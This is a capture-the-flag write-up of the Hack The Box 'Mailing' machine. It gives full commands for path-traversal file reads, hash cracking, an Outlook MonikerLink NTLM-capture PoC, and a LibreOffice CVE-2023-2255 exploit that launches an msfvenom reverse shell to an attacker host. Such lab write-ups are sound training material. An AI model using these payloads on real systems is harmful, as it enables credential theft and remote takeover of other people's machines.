---
description: 'Release date: 04 May, 2024 - Easy Windows machine'
---

# HTB Mailing

"Mailing" is a beginner-friendly Windows machine featuring hMailServer and a website vulnerable to Path Traversal. By exploiting this flaw, the hMailServer configuration file can be accessed, revealing an Administrator password hash, which can then be cracked to gain email account access. Additionally, [CVE-2024-21413](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-21413) allows NTLM hash capture for the user "maya" through the Windows Mail application, which can be cracked to log in via WinRM. For privilege escalation, [CVE-2023-2255](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-2255) in LibreOffice is exploited.

#### Nmap scan

We have open ports for email, http, smb.

<details>

<summary>Nmap scan</summary>

```
$ sudo nmap -sV -sC -T4 -p- 10.10.11.14
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-02 09:49 EDT
Nmap scan report for mailing.htb (10.10.11.14)                                                                                                                                                                          
Host is up (0.012s latency).                                                                                                                                                                                            
Not shown: 65515 filtered tcp ports (no-response)                                                                                                                                                                       
PORT      STATE SERVICE       VERSION                                                                                                                                                                                   
25/tcp    open  smtp          hMailServer smtpd                                                                                                                                                                         
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP                                                                                                                                                     
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY                                                                                                                                                           
80/tcp    open  http          Microsoft IIS httpd 10.0                                                                                                                                                                  
|_http-server-header: Microsoft-IIS/10.0                                                                                                                                                                                
| http-methods:                                                                                                                                                                                                         
|_  Potentially risky methods: TRACE                                                                                                                                                                                    
|_http-title: Mailing                                                                                                                                                                                                   
110/tcp   open  pop3          hMailServer pop3d                                                                                                                                                                         
|_pop3-capabilities: USER UIDL TOP                                                                                                                                                                                      
135/tcp   open  msrpc         Microsoft Windows RPC                                                                                                                                                                     
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn                                                                                                                                                             
143/tcp   open  imap          hMailServer imapd                                                                                                                                                                         
|_imap-capabilities: ACL IDLE NAMESPACE SORT IMAP4 RIGHTS=texkA0001 IMAP4rev1 completed QUOTA CAPABILITY OK CHILDREN                                                                                                    
445/tcp   open  microsoft-ds?                                                                                                                                                                                           
465/tcp   open  ssl/smtp      hMailServer smtpd                                                                                                                                                                         
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU                                                                                                    
| Not valid before: 2024-02-27T18:24:10                                                                                                                                                                                 
|_Not valid after:  2029-10-06T18:24:10                                                                                                                                                                                 
|_ssl-date: TLS randomness does not represent time
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
587/tcp   open  smtp          hMailServer smtpd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
993/tcp   open  ssl/imap      hMailServer imapd
|_imap-capabilities: ACL IDLE NAMESPACE SORT IMAP4 RIGHTS=texkA0001 IMAP4rev1 completed QUOTA CAPABILITY OK CHILDREN
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7680/tcp  open  pando-pub?
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

</details>

Adding mailing htb to: /etc/hosts

<figure><img src="broken-reference" alt=""><figcaption><p>3 usernames found here</p></figcaption></figure>

On the webpage "Download instructions" and intercept the request in Burp. The url download.php?file=instructions.pdf looks interesting for a possible LFI.

<figure><img src="broken-reference" alt=""><figcaption><p>LFI: /download.php?file=instructions.pdf</p></figcaption></figure>

Changing the filename to ../../../../../windows/win.ini reads the file.

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

From the Nmap scan we know hMailServer is running and checking the hMailServer documentation it shows there is a hMailServer.ini file. [https://www.hmailserver.com/documentation/v5.4/?page=reference\_inifilesettings](https://www.hmailserver.com/documentation/v5.4/?page=reference_inifilesettings)

```bash
587/tcp   open  smtp          hMailServer smtpd
```

Searching for hMailServer senstive files we hMailServer.ini to be interesting.

> "However, some settings are stored in the hMailServer.ini file. Examples of settings stored in the ini-file are paths and database connection information"

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

Using the LFI and reading hMailServer.ini the administrator password is visible.

```bash
GET /download.php?file=../../Program+Files+(x86)/hMailServer/bin/hMailServer.ini'

# Read file using Curl
curl 'http://mailing.htb/download.php?file=../../Program+Files+(x86)/hMailServer/bin/hMailServer.ini'
```

<figure><img src="broken-reference" alt=""><figcaption><p>The MD5 hash of Administrator</p></figcaption></figure>

Cracking the MD5 with hashcat

```bash
$ hashcat -m 0 '841bb5acfa6779ae432fd7a4e6600ba7' rockyou.txt

Dictionary cache hit:
* Filename..: rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921514
* Keyspace..: 14344385

841bb5acfa6779ae432fd7a4e6600ba7:<redacted>
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 841bb5acfa6779ae432fd7a4e6600ba7
Time.Started.....: Wed Oct  2 10:33:20 2024 (1 sec)
Time.Estimated...: Wed Oct  2 10:33:21 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  7323.4 kH/s (0.18ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 7567360/14344385 (52.75%)
Rejected.........: 0/7567360 (0.00%)
Restore.Point....: 7562240/14344385 (52.72%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: homepark11 -> holloman01
Hardware.Mon.#1..: Util: 16%
```

### The MonikerLink bug

<details>

<summary>Exploit</summary>

[CVE-2024-21413](https://research.checkpoint.com/2024/the-risks-of-the-monikerlink-bug-in-microsoft-outlook-and-the-big-picture/) - Is a zero day vulnerability in Outlook that allows adversaries to execute arbitrary code. The bug takes advantage of the Component Object Model (COM) when a user clicks on a maliciously crafted hyperlink in an email and so bypass security features.

Normal URL

```
*<a href=”file:///\\10.10.111.111\test\test.rtf”>CLICK ME</a>*
```

Modified link

```
*<a href="file:///\\10.10.111.111\test\test.rtf!something">CLICK ME</a>*
```

The difference is the "!" after the file name. This link will now bypass the Outlook security restrictions, and Outlook will continue to access the remote resource leading to the capture of NTLM hashes.

</details>

On [github](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability) a working PoC. Download the script and configure the flags. On the host machine start Responder and after a while, a NTLM hash will be captured.

```bash
# Run the PoC
python3 outlook.py --server mailing.htb --port 587 --username administrator@mailing.htb --password 'homenetworkingadministrator' --sender administrator@mailing.htb --recipient maya@mailing.htb --url "\\10.10.14.32\test\pwn" --subject Test

# Run responsoder or 
sudo Responder -I tun0
```

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

Cracking the NTLMv2 hash.

```bash
$ hashcat -m 5600 maya.hash rockyou.txt                       
hashcat (v6.2.6) starting

Dictionary cache hit:
* Filename..: rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921514
* Keyspace..: 14344385

MAYA::MAILING:9f3a3d7248516521:f7f3be24bae2519b3d47f6b6d79f17f2:0101000000000000002d0747cf14db01e532cf3dceb4b9d8000000000200080042004f004d00430001001e00570049004e002d0031003300530047004a004600460050004f004300350004003400570049004e002d0031003300530047004a004600460050004f00430035002e0042004f004d0043002e004c004f00430041004c000300140042004f004d0043002e004c004f00430041004c000500140042004f004d0043002e004c004f00430041004c0007000800002d0747cf14db0106000400020000000800300030000000000000000000000000200000689dc04858e3f2e579baa5756f87a41158aa50ec42e0b0dd9aa2ffaecaf6f4c20a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00330031000000000000000000:<redacted>
```

With the password login as Maya user and grab the first flag.

```bash
$ evil-winrm -i 10.10.11.14 -u maya -p m4y4ngs4ri
```

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

## Root flag

In installed applications in 'Program Files' folder we find LibreOffice. A version.ini file in program folder reveals the LIbreOffice version 7.4.0.1

```powershell
C:\program files\LibreOffice\program> type version.ini
```

<figure><img src="broken-reference" alt=""><figcaption><p>LibreOffice 7.4.0.1</p></figcaption></figure>

### CVE-2023-2255

LibreOffice supports "floating frames," which function similarly to HTML iframes by displaying linked documents within a floating frame inside the host document. In vulnerable versions of LibreOffice, these frames could automatically load external content without prompting the user for permission.

{% embed url="https://github.com/elweth-sec/CVE-2023-2255" %}

Generate payload using CVE-2023-2255.py

```bash
python3 CVE-2023-2255.py --cmd 'cmd.exe /c C:\ProgramData\reverse.exe' --output 'exploit.odt'
```

#### Upload exploit.odt to SMB share

```bash
$ smbclient \\\\10.10.11.14\\'Important Documents' -U maya                            
Password for [WORKGROUP\maya]:
Try "help" to get a list of possible commands.

smb: \> mput exploit.odt
Put file exploit.odt? y
putting file exploit.odt as \exploit.odt (584.4 kb/s) (average 584.4 kb/s)
smb: \> dir
  .                                   D        0  Wed Oct  2 15:10:44 2024
  ..                                  D        0  Wed Oct  2 15:10:44 2024
  exploit.odt                         A    30519  Wed Oct  2 15:10:44 2024

                8067583 blocks of size 4096. 1094931 blocks available
```

#### Generate tcp reverse shell using msfvenom and place it on C:\ProgramData

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.31 LPORT=8888 -f exe -o reverse.exe
```

#### Setup a listener on host and wait for connection

```bash
$ nc -lvnp 8888                                                                                                                                                                                                       
listening on [any] 8888 ...                                                                                                                                                                                             
connect to [10.10.14.31] from (UNKNOWN) [10.10.11.14] 56480                                                                                                                                                             
Microsoft Windows [Version 10.0.19045.4355]                                                                                                                                                                             
(c) Microsoft Corporation. All rights reserved.                                                                                                                                                                         

C:\Program Files\LibreOffice\program>whoami                                                                                                                                                                             
whoami                                                                                                                                                                                                                  
mailing\localadmin 
```

In C:\Users\localadmin\Desktop the root flag

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>
